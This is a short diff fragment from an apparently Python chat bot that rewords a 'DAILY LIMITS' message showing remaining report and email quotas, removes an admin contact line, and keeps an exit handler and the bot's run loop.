-            await e.respond(f"DAILY LIMITS\n\nReports: {DAILY_REPORT_LIMIT-rr}/{DAILY_REPORT_LIMIT}\nEmails: {DAILY_REPORT_LIMIT-re}/{DAILY_REPORT_LIMIT}\n\nResets at midnight.\nContact: {ADMIN_CONTACT}")
+            await e.respond(f"DAILY LIMITS\nReports: {DAILY_REPORT_LIMIT-rr}/{DAILY_REPORT_LIMIT}\nEmails: {DAILY_REPORT_LIMIT-re}/{DAILY_REPORT_LIMIT}\n\nResets midnight.")
 
     import atexit; atexit.register(lock_all)
     await bot.run_until_disconnected()
